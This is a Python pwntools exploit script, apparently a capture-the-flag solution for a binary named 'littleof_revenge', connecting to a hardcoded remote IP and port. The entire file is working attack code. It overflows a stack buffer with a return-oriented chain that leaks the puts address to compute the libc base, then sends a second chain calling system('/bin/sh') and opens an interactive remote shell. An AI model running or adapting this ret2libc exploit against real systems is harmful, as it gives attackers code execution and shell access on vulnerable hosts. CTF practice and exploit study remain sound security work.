from pwn import *
#nc 182.116.62.85 22192
remote_addr=['182.116.62.85',22192] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
context.log_level=True
context.terminal = ['tmux','sp','-h']
p=remote(remote_addr[0],remote_addr[1])
elf_path = "./littleof_revenge"
#p = process(elf_path)

libc = ELF("./libc-2.27.so")
elf = ELF(elf_path)

#gdb.attach(p, 'c')

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

if __name__ == '__main__':
    pop_rdi = 0x0000000000400823
    ret = 0x400566
    main_addr = 0x400743
    puts_got = elf.got["puts"]
    puts_plt = elf.plt["puts"]
    ru("?\n")
    buff = "A" * 0x40 + p32(0x123454) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    #gdb.attach(p)
    p.sendline(buff)
    puts_addr = raddr(6)
    libc.address = puts_addr - libc.symbols["puts"]
    lg("libc address", libc.address)

    system_addr = libc.symbols["system"]
    sh_addr = libc.search("/bin/sh").next()
    ru("?\n")
    buff = "A" * 0x40 + p32(84) + p64(pop_rdi) + p64(sh_addr) + p64(ret) + p64(system_addr)
    p.sendline(buff)
    p.interactive()
